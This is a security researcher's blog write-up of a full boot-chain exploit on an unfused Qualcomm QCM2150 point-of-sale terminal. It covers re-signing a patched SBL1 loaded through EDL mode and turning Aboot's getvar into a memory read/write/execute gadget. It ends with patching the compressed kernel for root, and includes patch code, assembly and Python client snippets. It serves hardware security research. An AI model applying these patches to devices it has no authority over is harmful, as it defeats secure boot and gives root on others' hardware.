---
layout: post
title:  "A Full-Chain Exploit of an Unfused Qualcomm Device"
lang: en
categories: qualcomm
tags: [qcm2150, edl, secure-boot]
---
### **Background**

I believe my journey into Secure Boot research began back in 2017. At the time, my focus was on the `bootloader`, or more precisely, the module that could be interacted with via `fastboot`. The main area of interest was vendor-specific custom commands, like those found in devices from Smartisan and Huawei<sup>[1](https://github.com/hhj4ck/BLUnlock)</sup>. Unlocking the `bootloader` to gain root access was the ultimate goal back then. Public research into `bootloader` vulnerabilities was still in its infancy, and due to their massive market share, efforts were largely concentrated on phones with Qualcomm chips. It wasn't long after, upon reviewing some related research, that I pivoted to Huawei's Secure Boot chain, but that's a story for another time<sup>[2](https://x.com/hhj4ck/status/1125077037755052032),[3](https://x.com/hhj4ck/status/1421129186756861957),[4](https://x.com/hhj4ck/status/1689349620886073344)</sup>.

Around 2018, a number of classic research papers emerged, opening up a new frontier in mobile device vulnerability research. The one that influenced me most profoundly was Aleph Security's analysis of Qualcomm's Emergency Download Mode (EDL)<sup>[5](https://alephsecurity.com/2018/01/22/qualcomm-edl-1)</sup>. It was the first time anyone had publicly discussed EDL in such detail. In short, by shorting test points or using special boot commands, the chip's BootROM could be forced into a download mode. This allowed a PC to interact with the device over USB using the Sahara and Firehose protocols. By sending a legitimate `loader`, one could read/write the disk and memory, bypass Secure Boot, and achieve effects like gaining root or patching TrustZone to extract hardware-backed keys and bypass the lock screen.

Two aspects of their research had the deepest impact on me:

First, the report was exceptionally detailed. It makes me quite nostalgic, as this level of exhaustive, no-holds-barred sharing is a rarity today. I feel that researchers of that era had a "call it as you see it" ethos; they would explain technical details, the pitfalls they encountered, and the methods they attempted with complete transparency. This sparked my deep interest in low-level systems.

Second, I realized that even within high-end vendors, you'll find all sorts of bizarre implementations and unorthodox methods. It seems they often leave a back door open for both themselves and potential attackers. This insight proved invaluable in my later research on Huawei phones.

Subsequently, Bjoern Kerler's EDL tool<sup>[6](https://github.com/bkerler/edl)</sup> greatly popularized this entire field. Beyond collecting a vast number of `loader` files, it also discussed many vendor-specific custom functions. Later, at Hexacon 2023, Seamus Burke and Aaron Willey disclosed vulnerabilities in the Sahara protocol's implementation, thoroughly dissecting the BootROM and EDL.

Throughout these years of research, I had often heard legends of "unfused" phones—devices where the security fuses had not been blown. Bjoern's code and the Hexacon presentation both mentioned such devices. My first encounter with the concept might have been from Edgar Barbosa's talk at Syscan 2016<sup>[7](https://www.yumpu.com/en/document/read/56698807/executing-code-in-the-trustzone-land)</sup>. He discovered that a Xiaomi Redmi Note 2 allowed flashing an arbitrary `tz.img`, granting him code execution in TrustZone. He may not have realized it at the time, but I suspect this was because Xiaomi had forgotten to blow the fuses on that model. My later work on Huawei helped me grasp the physical meaning of an unfused state. A key purpose of blowing fuses is to permanently write the hash of the root-of-trust public key into a non-modifiable region, thereby enabling Secure Boot. From that point on, only firmware signed by the vendor can be booted by the BootROM. The legend echoed on, but I had never seen such a device in the flesh.

Until recently, that is. I finally encountered an unfused device, and a POS terminal at that. This gave me the opportunity to execute a full, BootROM-level code execution attack on the Qualcomm boot chain, following the sequence BootROM (PBL) -> SBL1 -> Trustzone & Aboot -> Kernel -> Android, patching TrustZone and the Kernel, and ultimately gaining root access post-boot.

### 1\. The Meaning of an "Unfused" Device

First, let's clarify what "unfused," or "Secure Boot disabled," really means.

Qualcomm platforms have a special partition, typically named `sec`. This partition is meant to hold the data you intend to burn into the `eFuses` (one-time programmable fuses). From a Secure Boot perspective, its core content is the **hash of the root public key**. During boot-up, at every stage of the boot chain—whether it's the BootROM, the SBL1, or even Aboot—any component involved in Qualcomm's code signature verification will read this hash from the `eFuses` and compare it against the root public key hash found in the certificate chain of the image being verified. If they match, the image is deemed legitimate and is allowed to execute.

When the `eFuses` have not been blown, the system reads a default value for the public key hash, which signifies a "non-secure" state. The phone then knows it is in an insecure mode and consequently **skips the final validation of the root certificate's legitimacy**. This means that while images at each stage of the boot chain still require a valid signature (i.e., conforming to Qualcomm's format with a self-consistent certificate chain), the root of that chain can be any key you generate yourself; it doesn't need to match a specific value fused into the device.

On my device, I initially confirmed the unfused state through several indicators:

**Fastboot Getvar**: In `fastboot` mode, the command fastboot getvar secure returned no.

```bash
$ fastboot getvar secure
  secure: no
  Finished. Total time: 0.007s
```

**SEC Partition Format**: A Qualcomm `sec` partition consists of a Header (describing length, name, etc.), Content (specifying fuse bits and values to burn), and a Footer = SHA256(Header + Content). Evidently, the Content area of this partition was empty, perfectly matching the "unwritten" state.

```
00000000: ca 51 72 3b 29 6f 12 2a 02 00 00 00 20 00 00 00  .Qr;)o.*.... ...
00000010: 74 65 73 74 20 73 65 63 20 66 69 6c 65 00 00 00  test sec file...
00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030: 71 e5 57 5f 14 d4 a5 f7 5b 7b 71 e6 ba 3c 9a 93  q.W_....[{q..<..
00000040: bf e6 1d bc 52 be 4a 5f 41 a7 6f 2e e6 21 1f 5b  ....R.J_A.o..!.[
```

**EDL Tool Output**: When interacting with the device using an EDL tool, the public key hash (PK\_HASH) it returned was a public, default value common to all unfused devices, not a unique device-specific hash.

```
Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2025.
main - Using loader sbl1.mbn ...
main - Waiting for the device
....main - Device detected :)
sahara - Protocol version: 2, Version supported: 1
main - Mode detected: sahara
sahara - 
Version 0x2
------------------------
HWID:              0x0013d0e100000000 (MSM_ID:0x0013d0e1,OEM_ID:0x0000,MODEL_ID:0x0000)
CPU detected:      "qcm2150"
PK_HASH:           0xcc3153a80293939b90d02d3bf8b23e0292e452fef662c74998421adad42a380f
```

Barring any esoteric firmware modifications by the vendor, these points collectively confirmed that the device was indeed in a Secure Boot disabled state.

### 2\. No Firehose Loader? Let SBL1 Be

With the premise confirmed, the real challenge began. The POS terminal used a relatively obscure QCM2150 chip. Despite the fact that any validly signed `loader` should work without root signature verification, I couldn't find a single public `Firehose` loader for it. Without a `loader`, I couldn't use EDL mode to read/write the partitions and memory to execute Aleph Security's attack chain. In their research, Aleph Security had attempted to use a `Firehose` loader in place of the SBL1 ("Failed Attempts: Porting the Attack to Other Devices")<sup>[8](https://alephsecurity.com/2018/01/22/qualcomm-edl-5/)</sup> to achieve a chained boot, switching from EDL to Normal mode to start TrustZone and Aboot, and eventually bring up the full Android system. They found the main difference between the two was an entry in a function table that was `null` in SBL1 but pointed to `firehose_main` in the `loader`. However, they abandoned this approach because they couldn't correctly restore the boot state and fully modify the boot flags passed from the BootROM to the `loader`. Their attempt illustrates that forcing a loader designed for EDL mode to perform a normal boot (or vice versa) is extremely difficult due to differing runtime memory states and device initialization statuses (especially for the flash storage). They ultimately relied on a hardware debugger to patch the chain stage by stage.

This gave me an idea, though: could I do the reverse? Use the SBL1 to replace the `Firehose` loader and achieve code execution from EDL mode. My situation was dire: **I had no `loader`, let alone a debugger**. I had to tackle it head-on, armed with nothing but an SBL1 image from a device of the same model. My strategy was this: **load SBL1 as a `loader` via EDL mode, then patch the code within this SBL1 to forcibly switch the boot state from EDL back to Normal mode.**

To achieve this, I first needed to get arbitrary code execution in the SBL1 stage. Initially, I simply patched an infinite loop into the SBL and tried to load it. The device froze, just as expected. I was quite pleased at first, thinking my infinite loop was working. However, after repeated attempts, I discovered the harsh truth: I had simply broken the signature, causing the BootROM to fail the load and hang. My code wasn't executing at all\! After this setback, I spent some time reverse-engineering the SBL to understand its certificate format and the three-tiered signature structure. In parallel, I was lucky enough to find the `sectools` utility<sup>[9](https://github.com/basehub/sectools)</sup>. Although it required Python 2, it could perfectly re-sign my modified SBL1.

```bash
$ python sectools.py secimage -i sbl1.mbn -c config/2150/2150_secimage.xml -s
...
Generating new Attestation certificate and a random key

Attestation Certificate Properties:
| SW_ID     | 0x0000000000000000  |
| HW_ID     | 0x0000000000000000  |
| DEBUG     | 0x0000000000000002  |
| OEM_ID    | 0x0000              |
| SW_SIZE   | 360                 |
| MODEL_ID  | 0x0000              |
| SHA_ALGO  | SHA256              |
| APP_ID    | None                |
| CRASH_DUMP| None                |
| ROT_EN    | None                |
| Exponent  | 3                   |
| TCG_MIN   | None                |
| TCG_MAX   | None                |
| FID_MIN   | None                |
| FID_MAX   | None                |

Signed image is stored at secimage_output/2150/sbl1/sbl1.mbn

Base Properties: 
| Integrity Check                 | True  |
| Signed                          | True  |
| Encrypted                       | False |
| Size of signature               | 256   |
| Size of one cert                | 2048  |
| Num of certs in cert chain      | 3     |
| Number of root certs            | 1     |
| Hash Page Segments as segments  | False |
| Cert chain size                 | 6144  |

ELF Properties: 
Elf Header: 
| Magic                      | ELF                            |
| Class                      | ELF32                          |
| Data                       | 2's complement, little endian  |
| Version                    | 1 (Current)                    |
| OS/ABI                     | No extensions or unspecified   |
| ABI Version                | 0                              |
| Type                       | EXEC (Executable file)         |
| Machine                    | Advanced RISC Machines ARM     |
| Version                    | 0x1                            |
| Entry address              | 0x080078e0                     |
| Program headers offset     | 0x00000034                     |
| Section headers offset     | 0x00000000                     |
| Flags                      | 0x05000002                     |
| ELF header size            | 52                             |
| Program headers size       | 32                             |
| Number of program headers  | 8                              |
| Section headers size       | 40                             |
| Number of section headers  | 0                              |
| String table section index | 0                              |

Elf Program Headers: 
| S.No | Type | Offset | VirtAddr | PhysAddr | FileSize | MemSize |   Flags    | Align |
|------|------|--------|----------|----------|----------|---------|------------|-------|
|  1   | LOAD |0x58a74 |0x00220000|0x00220000| 0x02bfc  | 0x02bfc | 0x00000005 | 0x10  |
|  2   | LOAD |0x5b670 |0x00223000|0x00223000| 0x00b28  | 0x00b48 | 0x00000006 | 0x8   |
|  3   | LOAD |0x482f4 |0x08000000|0x08000000| 0x00000  | 0x03000 | 0x00000006 | 0x4   |
|  4   | LOAD |0x03000 |0x08005000|0x08005000| 0x452f4  | 0x452f4 | 0x80000005 | 0x10  |
|  5   | LOAD |0x482f4 |0x0805a000|0x0805a000| 0x00000  | 0x04000 | 0x00000006 | 0x4   |
|  6   | LOAD |0x482f4 |0x0805e000|0x0805e000| 0x10780  | 0x19854 | 0x00000006 | 0x1000|
|  7   | LOAD |0x58a74 |0x80000000|0x80000000| 0x00000  | 0x00000 | 0x00000004 | 0x4   |
|  8   | LOAD |0x58a74 |0x86700000|0x86700000| 0x00000  | 0x6a714 | 0x00000006 | 0x4000|

Hash Segment Properties: 
| Header Size  | 40B  |

Header: 
| cert_chain_ptr  | 0x8676b268  |
| cert_chain_size | 0x00001800  |
| code_size       | 0x00000140  |
| flash_parti_ver | 0x00000003  |
| image_dest_ptr  | 0x8676b028  |
| image_id        | 0x00000015  |
| image_size      | 0x00001a40  |
| image_src       | 0x00000000  |
| sig_ptr         | 0x8676b168  |
| sig_size        | 0x00000100  |

SecElf Properties: 
| image_type        | 0     |
| max_elf_segments  | 100   |
| testsig_serialnum | None  |

------------------------------------------------------

SUMMARY:
Following actions were performed: "sign"
Output is saved at: secimage_output

| Idx | SignId | Parse | Integrity | Sign | Encrypt |              Validate              |
|     |        |       |           |      |         | Parse | Integrity | Sign | Encrypt |
|-----|--------|-------|-----------|------|---------|-------|-----------|------|---------|
|  1. |  sbl1  |   T   |     NA    |  T   |    NA   |   NA  |     NA    |  NA  |    NA   |
```

### 3\. Navigating in the Dark: Loading the Modified SBL

With a properly signed SBL1, I loaded it onto the device via EDL mode. But here I faced a huge problem: **I had no means of interaction**. After the SBL1 executed, I couldn't get any feedback like I would with a `Firehose` loader, nor could I check logs to see how far it had progressed. I devised a simple but effective method: at a key path in the SBL1 code that I expected to be executed, I patched in a jump to `boot_dload_transition_pbl_forced_dload`. This would cause the device to reboot, but back into download mode.

```assembly
LOAD:08019E30 boot_dload_transition_pbl_forced_dload  ; CODE XREF: boot_dload_check+20↑p
LOAD:08019E30                                         ; appsbl_jump_func+94↓p
LOAD:08019E30                                         ; DATA XREF: ...
LOAD:08019E30                 LDR             R1, =0x193D100
LOAD:08019E32                 LDR             R0, [R1]
LOAD:08019E34                 MOV             R0, #1
LOAD:08019E3C                 LDR             R2, [R1]
LOAD:08019E3E                 BFI.W           R2, R0, #0, #4
LOAD:08019E42                 STR             R2, [R1]
LOAD:08019E44                 MOV.W           R0, #1
LOAD:08019E48                 B.W             boot_hw_reset
```

After my code executed, the device didn't hang, nor did it reboot into the normal OS. Instead, it rebooted right back into `Sahara` mode. This was definitive proof that my code had successfully executed. Despite being a primitive feedback mechanism, it gave me the confidence to proceed. I had successfully achieved code execution in the SBL1 stage.

### 4\. Dawn's Exploration: Patching Aboot

Having gained code execution in SBL1, the next objective was to let the boot process continue and gain control over Aboot (the bootloader where `fastboot` resides).

This was another difficult leap. As Aleph Security encountered, the SBL1 environment in EDL mode is vastly different from that of a normal boot. By reverse-engineering the SBL1, I identified two critical points to patch:

**EDL Mode Detection**: The SBL1 checks a specific register to determine if it's in EDL mode. I needed to patch this check to always return `false` (i.e., normal mode) and also clear the status flags (bits 0 and 16 at `0x193D100`) to prevent subsequent boot stages from detecting EDL through other means.


```assembly
LOAD:08019D40 boot_dload_entry                        ; CODE XREF: boot_dload_check+8↑p
LOAD:08019D40                 LDR             R1, =0x193D000
LOAD:08019D42                 LDR.W           R0, [R1,#0x100]
LOAD:08019D46                 AND.W           R0, R0, #0x10
LOAD:08019D4A                 CBZ             R0, loc_8019D5C
LOAD:08019D4C                 LDR.W           R0, [R1,#0x100]
LOAD:08019D50                 BIC.W           R0, R0, #0x10
LOAD:08019D54                 STR.W           R0, [R1,#0x100]
LOAD:08019D58                 MOVS            R0, #1
LOAD:08019D5A                 BX              LR
LOAD:08019D5C                 MOVS            R0, #0
LOAD:08019D5E                 BX              LR
```

**Missing Storage Type**: In EDL mode, the storage medium type (eMMC/UFS) isn't initialized, but the SBL needs this information to load Aboot. Through trial and error, I found that forcing this value to `5` (for eMMC) worked.

```c
enum boot_flash_type : __int32
{                                       
    NO_FLASH         = 0x0,
    NOR_FLASH        = 0x1,
    NAND_FLASH       = 0x2,
    ONENAND_FLASH    = 0x3,
    SDC_FLASH        = 0x4,
    MMC_FLASH        = 0x5,
    SPI_FLASH        = 0x6,
    UFS_FLASH        = 0x7,
};
```

After applying these two patches and re-signing SBL1, I loaded it again via EDL. This time, the device booted up in Normal mode, and my SBL1 code ran as intended.

To consistently stop at the `fastboot` command loop and gain basic memory read capabilities, I still had to patch Aboot. Since I didn't have the Aboot image for the device, this required brute-force searching for instruction signatures to locate key functions.

```assembly
LOAD:8F63DEC8 fastboot_ack                            ; CODE XREF: sub_8F63DF7C+158↓p
LOAD:8F63DEC8                                         ; sub_8F63DF7C+248↓p ...
LOAD:8F63DEC8
LOAD:8F63DEC8 var_E4          = -0xE4
LOAD:8F63DEC8 var_9D          = -0x9D
LOAD:8F63DEC8 var_18          = -0x18
LOAD:8F63DEC8
LOAD:8F63DEC8                 PUSH            {R4-R6,R11,LR}
LOAD:8F63DECC                 ADD             R11, SP, #0x10
LOAD:8F63DED0                 SUB             SP, SP, #0x14
```

The `ADD` and `SUB` instructions could be used as a signature for searching. Sometimes the offset might be off by 4 or 8 bytes, but it's findable with a bit of trial and error.

Since the device lacked volume keys, I patched two things: first, the key detection logic to make it always think the volume down key was pressed, forcing it into the `bootloader` interface. Second, I modified `cmd_getvar` to give it basic memory `dump` capabilities. During this blind attempt, I discovered that the default Aboot had been heavily stripped; apart from `download` and `getvar`, essential commands like `flash`, `boot`, `continue`, and even `reboot` were all gone.

While only `download` and `getvar` remained, this was enough to create an opening. My plan was to turn the `getvar` command into a universal memory-reading "gadget." The `download` command allowed me to write data (like the memory address I wanted to read) into a fixed buffer. Then, via a patch, I could change `getvar`'s logic from fetching a variable to reading the address I had just written and returning the data at that location. To keep the patch code minimal, I also leveraged the `download buffer` at `0xA0100400` to stage all the necessary arguments for `fastboot_ack`. This initial read tool was functional but painfully slow, as `fastboot` returns very small amounts of data at a time. It took me nearly half an hour to dump the complete Aboot binary (around 1MB).

With this setup, the SBL1 would boot and automatically enter the bootloader, where I could use my custom `fastboot getvar` to read out the Aboot code for analysis.
```c
void cmd_getvar(char *arg, char *data, unsigned sz) {
    char *buff = (char *)0xA0100400;
    int addr = *(int *)buff;
    if(sz) {
        int value = *(int *)addr;
        for(int i = 0; i < 32; i++) {
            buff[0x1F - i] = ((value >> i) & 0x1) + 0x30;
        }
        buff[0x20] = 0;
        fastboot_ack((char *)0xA0100430, buff);
    }
}
```

While analyzing the dumped Aboot binary, I discovered a hidden treasure: the developers had left an `upload` function in the code as a `fastboot` command\! This function did the opposite of `download`, allowing for high-speed reading of a specified memory address and length, sent back over USB. This dramatically sped up my subsequent dumping of other images.

```c
int cmd_upload(char *arg, char *data, int size)
{
  int v3; // r7
  int result; // r0
  int v5; // r0
  _BYTE v6[133]; // [sp+3Fh] [bp-A5h] BYREF
  int v7; // [sp+C4h] [bp-20h]

  v7 = stackcookie;
  v3 = upload_sz;
  if ( upload_base && upload_sz )
  {
    snprintf((unsigned int)v6 & 0xFFFFFFC0, 64, "DATA%08x", upload_sz);
    v5 = strlen((_BYTE *)((unsigned int)v6 & 0xFFFFFFC0));
    result = ((int (__fastcall *)(unsigned int, int))usb_write)((unsigned int)v6 & 0xFFFFFFC0, v5);
    if ( result >= 0 )
    {
      sub_8F631E84(upload_base, v3);
      result = ((int (__fastcall *)(int, int))usb_write)(upload_base, v3);
      if ( (result != v3) | ((unsigned int)result >> 31) )
        fastboot_state = 3;
      else
        result = (int)fastboot_ack(aOkay, (const char *)&unk_8F67364C);
    }
  }
```

However, since this was leftover code, `upload_base` and `upload_sz` were never initialized. I had to use the arbitrary write capability of my patched Aboot to initialize these two variables. Finally, based on the Aboot analysis, I created a version of `getvar` that served as a full read, write, and execute (`rwx`) gadget.

```c
void cmd_getvar(char *arg, char *data, unsigned sz) {
    char *okay = (char *)0x8F677A7C;
    void (*fastboot_ack)(char *, char *) = (void (*)(char *, char *))0x8F638644;
    void (*sn_printf)(char *, int, char *, ...) = (void (*)(char *, int, char *, ...))0x8F642D20;
    void (*memcpy)(void*, void*, int) = (void (*)(void*, void*, int))0x8F642FBC;
    char *obuff = (char *)(0xA0100400 + 0x1000);
    int *ibuff = (int *)0xA0100400;
    if(sz) {
        int cmd = ibuff[0];
        if(cmd == 0x4ead) {
            int value = *(int *)ibuff[1];
            sn_printf(obuff, 0x1000, (char *)0x8F676B89, value);
        } else if(cmd == 0x3417e) {
            int addr = ibuff[1];
            int size = ibuff[2];
            memcpy((char *)addr, ibuff + 3, size);
            sn_printf(obuff, 0x1000, (char *)0x8F676B89, addr);
        } else if(cmd == 0x3a11) {
            int (*f)(int,int,int,int) = (int (*)(int,int,int,int))ibuff[1];
            int res = f(ibuff[2], ibuff[3], ibuff[4], ibuff[5]);
            sn_printf(obuff, 0x1000, (char *)0x8F676B89, res);
        }

    }
    fastboot_ack(okay, obuff);
}
```


To interact with this private `upload` command, we can to modify the `python-adb` library<sup>[10](https://github.com/google/python-adb)</sup>, which also required Python 2.

First, I modified the library by adding an `Upload` method to `fastboot.py`:

```python
def Upload(self, dst_file, length, verbose=True, timeout_ms=None):
    """Dump Wrapper
    Args:
    dst_file: Memdump to this file
    length: how many bytes to dump
    Returns:
    Usually nothing
    """
    length = int(length, 16)
    self._protocol.SendCommand(b'upload')
    self._protocol.usb.BulkRead(12, timeout_ms=timeout_ms)
    buff = self._protocol.usb.BulkRead(length, timeout_ms=timeout_ms)
    res = self._protocol.usb.BulkRead(5, timeout_ms=timeout_ms)
    fp = open(dst_file, "wb")
    fp.write(buff)
    fp.close()
```

After adding this, I could use a client script to call it and achieve high-speed memory dumps:

```python
def dump(addr, length):
    upload_base = 0x8F6DC0D0
    upload_sz = 0x8F6DC138
    write(upload_base, p32(addr))
    write(upload_sz, p32(length))
    length = "%08x" % length
    device.Upload("dump", length)
```

### 5\. Full Control: Modifying Aboot and Conquering the zImage

With this high-speed `rwx` interface, the first thing I did was call the internal `mmc_read` function to read various partitions, including `boot.img`, and dump them back for analysis.

The next challenge was patching `boot.img` to get root access. Unpacking `boot.img` and extracting the kernel with a tool like Android\_boot\_image\_editor<sup>[11](https://github.com/cfig/Android_boot_image_editor)</sup> was not difficult. However, this device used `system_as_root`, so there was no separate `ramdisk` to modify `init` with methods like Magisk. The only option was to patch the kernel code directly. But its kernel consists of three main parts: a `header` (with self-decompressing code), the `gzip` compressed kernel data, and a `device tree`. The problem is that the decompression code has hardcoded information about the compressed kernel's size, and the `device tree` extraction also depends on this size for its offset. The result of these visible and invisible dependencies is that if the compressed kernel's size changes at all, the kernel will fail to boot. Therefore, after modifying the kernel, the re-compressed image **had to be exactly the same size as the original**.

This problem reminded me of a similar `gzip` challenge I faced while researching Huawei devices. In that case, I needed to exploit a vulnerability in the `recovery` partition by crafting a special `recovery.gz` file where the CRC checksum of each data block was a fixed, predetermined value. These experiences taught me that while the `gzip` format itself is simple, the attacks and defenses surrounding it can be remarkably sophisticated.

My final solution took advantage of a feature of the `gzip` format: **its header can contain an optional, variable-length filename**. A review of the 4.9 kernel source code confirmed that the self-decompressing code did not impose any limits on this filename's length.

```c
/* skip over asciz filename */
if (zbuf[3] & 0x8) {
do {
    /*
    * If the filename doesn't fit into the buffer,
    * the file is very probably corrupt. Don't try
    * to read more data.
    */
    if (strm->avail_in == 0) {
    error("header error");
    goto gunzip_5;
    }
    --strm->avail_in;
} while (*strm->next_in++);
}
```

So, my patching process was as follows:

1.  Decompress the original image to get the raw kernel, `Image`.
2.  Apply binary patches to `Image`, for instance, modifying a syscall to grant the caller root privileges.
3.  If the modified `Image`, when re-compressed, is larger than the original, find unimportant strings (like log messages) and replace them with repeating characters or zeros to reduce entropy, thus making the compressed size smaller than or equal to the original.
4.  If the compressed size is smaller, specify a long "filename" during `gzip` compression to precisely pad the missing bytes, ensuring the final compressed image is identical in size to the original.

Notably, while repeatedly debugging the Gzip format, I stumbled upon an interesting side-discovery. When I crafted Gzip headers in certain specific ways, the kernel's self-decompressing code would crash. I didn't have time to investigate further, but one has to wonder: does this hide a memory corruption vulnerability, or perhaps even a 0-day that could be used for persistence?

After this, I modified Aboot's `mmc_read` logic so that when it read an offset belonging to `boot.img`, it would instead fetch my patched `boot.img` from `0xA5000000` (part of the controllable `download buffer`). Then I would call `boot_linux_from_mmc()` to simulate the `cmd_continue` command, allowing the bootloader to proceed with booting the patched kernel. This completed an attack chain that started with SBL1 code execution, involved no disk writes, and guided a modified `TZ` and `Kernel` to a normal system boot, all purely in memory. Finally, the device booted successfully, and I had a root shell. As a side note, patching TrustZone and Aboot from SBL1 mode follows the same principles; as a proof of concept, I simply modified some strings to confirm the capability was working.
